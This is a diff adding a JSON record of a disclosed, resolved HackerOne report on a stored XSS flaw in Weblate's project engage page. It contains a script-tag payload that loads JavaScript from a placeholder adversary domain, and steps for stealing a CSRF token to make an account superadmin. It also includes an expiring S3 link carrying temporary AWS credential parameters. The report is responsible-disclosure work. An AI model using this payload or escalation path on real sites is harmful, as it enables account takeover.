@@ -1,0 +1,126 @@
+{
+  "id": 472391,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzIzOTE=",
+  "url": "https://hackerone.com/reports/472391",
+  "title": "Stored XSS @ /engage/<project_slug>",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-12-26T22:13:28.975Z",
+  "submitted_at": "2018-12-26T22:13:28.975Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lgian",
+    "url": "/lgian",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19468,
+    "url": "https://hackerone.com/weblate",
+    "handle": "weblate",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/468/71eb3827ae9f2a388f27bd4b7eefd20bc3ac813c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Weblate",
+      "twitter_handle": "WeblateOrg",
+      "website": "https://weblate.org/",
+      "about": "Weblate is a libre software web-based continuous localization system"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-07-02T12:40:01.189Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-07-02T12:40:01.110Z",
+  "team_member_agreed_on_going_public_at": "2018-12-27T12:14:26.696Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Description\nThe vulnerability concerns a Stored XSS, while it is currently (to the best of my knowledge) not exploitable due to limitations stated below. I thought that the issue is worth reporting anyway.\n\n## Steps to reproduce\n1. Change a project's name (or create one) to the following payload:  \n `<script src=\"http://<adversery_domain>/payload.js\"></script>`, where `<adversary_domain>` could be any domain that you own. For testing purposes you can host the javascript file on localhost.\n2. Navigate to `/engage/<project_slug>`, where `<project_slug>` is the project's url slug.\n3. Any javascript payload you host will be executed under the origin of weblate.\n\n## Referenced code\nThe code that is the root cause for the vulnerability is under: `weblate/trans/views/basic.py:show_engage:123`, where `show_engage` is the view called for the `/engage/<project_slug>` url.\n\n### Caveats\n1. A project's name is limited to 60 characters, therefore we cannot inject our payload straight into it. A bypass for that is the one referenced in step 1, where we load an external javascript file from a domain we own.\n2. By default the application's CSP only allows scripts from certain domains (cdnjs etc.). Although, the default CSP allows `unsafe-inline` when any CDN is enabled.\n3. The session cookie is uses the attributes `HttpOnly` and `SameSite=lax`, therefore hijacking the superadmin's session token is impossible (for most browsers).\n4. In order to perform the attack, you have to own a user account that can change a project's name, which is true for any project administrator.\n\n#### Possible bypasses\n1. A project's name character limit is extended.\n2. Since the application supports file uploads and the CSP allows scripts coming from `self` (current domain), one could upload their payload to the Weblate installation. This bypass would require an endpoint that accepts uploading HTML/javascript content and stores it under the `media` uploads. \n\n### Proof of Concept\nIn order to get any value of the present XSS, since we cannot steal the superadmin's session token, we can perform any action as the superadmin. That is because we can issue any GET/POST request and read the response, since we operate under the same origin as the hosted application. As mentioned before, in order to perform the following attack, we need a user account that can change a project's name. \n\n1. Issue a GET request under `admin/weblate_auth/user/` in order to find our user record's ID. \n2. Issue a GET request under `admin/weblate_auth/user/5/change/`, assuming that the ID is 5 for instance.\n3. Read the previous' request's response in order to steal the `csrfmiddlewaretoken` that Django injects to protect against such attacks.\n4. Issue a POST request using the above information to make our user a superadmin.\n\nThe `payload.js` that automatically does the steps 2-4 is attached to the report (except for parsing the response for csrftokenmiddlware, which is trivial using javascript).\n\n## Proposed fixes\n1. Escape the project's name using django's `escape` function before output\n2. Remove the `unsafe-inline` directive from the CSP when CDNs are enabled.\n\n## Impact\n\nGiven a bypass to either the project's name character limit or the CSP, any user that has the ability to change a project's name can make themselves a superuser through CSRF.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 397485,
+      "file_name": "payload.js",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/397/485/52cb8e6376d1408b18dbc1eb6a542dc6376bce6d/payload.js?response-content-disposition=attachment%3B%20filename%3D%22payload.js%22%3B%20filename%2A%3DUTF-8%27%27payload.js&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6PGWSTMP%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131550Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCViOi%2F56ueEuvIwenQe%2BLb%2BwbBeFYt95o%2B27q1gAyjJQIhAJy41GZeNB%2F35zQFEMMldvRn9RKuTJ921mYFGjWXM4xOKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igyfj5amkH4Q4qV17RUqjwW2CAxiK4m4hWEAlsDvzI4tTbj8wtQkEbV8t3TJ6TszDYzbxoZfKv%2FF1ngpPiZtnooExkiPG26fSsSPVxr95a5R%2Bb53aIMfs4cvspAbjO408u%2FKZN5zXVPh6CnfCbsN8F6X%2F9KN%2Fbv66jc7vpds0BIK8%2B6fFbH50L%2BJ7loxPgYJpwQKPGA%2BxAU3n4cW0xu40kEa4HScwwT%2BqFoMNkHSPq7v%2FMX6cc1VRdiCryuyIqwF%2Bs0t%2FvdjeVHg78LS0%2FuMMNkbwDSMNufKbDqARDuoU0P%2F7njwSrXV5%2BkRLbGbe0L89dhffkGntr%2Bd%2FtQ8CCYU66m%2FjoL0k41lI2HeR3O7pLZw6xc3baudQgvKzzU8naKjeMtCWmGIlkN1deTGbW6VWFv94mPhh6xqwYF%2FygK1ASZXWcjKuCZDkbIOgvNsJXfi9GobE%2Fg%2FQCvqFLRdBFuYpEHQ%2BmeEDcfMacgRXA297IImF0dUJN85r5YBUSsTgEED3A1n%2BDuZ7EYlyHsa0FOqtqBvavx526YAyqmogm2M05wZ7943732ur203IxCn9N2G019Q9wlJDIhQKk2ujbfG2QJJ9kcZT0%2FclqOtb7n1O02fUwDgOTGWF7a6VW3W7hV6bjCy%2B5Rac9PzkS6VymX8vtLX1k%2FZgwFkOteSUd2%2FRZ6WSu3ZzHNAUkrRcuUOocwK48DWkjTuzKGjaWSycV5T7TkIYO82PSRCe3%2FO3LFd%2F1MQ3Lt2TctQHWcm%2FuYG8L64tYNCvpptkP4lbIEMyLovg2Tcvod1IiJWSFCfdjo3%2F62cnjstu7oIkOgQE1rNQRi7tl%2BOpOZ3O2p1%2BkSM9%2F0IDEkXXc43X4wqyrJxFCXTAgtGobNnX8BPw1JLWKKzcjvCMLC1ra4GOrABG6HOSlDmK1pVHFgvG0UCsHX0y77qrI5WogVE2SsoeRtdX%2BFgr0TJVFxF%2FqzndNjCSF1CE7s5o1cvQRnubzfIEHh%2Bql4Yr2YDxqHDFub6HZHglXezaL0SQVMK924Vna4%2Fd7oHIUZe52JuzZ8HuqQcy4plSO1mkvy6u0L4T%2F1njIpact7INdijf%2B1WFhWhjy0qA%2BmL%2BCVvUwMMaTaqrHm4JzWtOGywBhoyvrV0SfdDvYQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9209da3fc1e4f16952b8537bd68fa997ce1f2c2a29d811795d7b40f6e8872ccb",
+      "file_size": 746,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-01-26T12:14:26.771Z",
+  "allow_singular_disclosure_after": -159325283.26377612,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "sameerphad72",
+    "ali",
+    "cryptographer",
+    "tiago-danin",
+    "nonbetter1",
+    "watskip",
+    "meispi"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 173,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/WeblateOrg/weblate",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
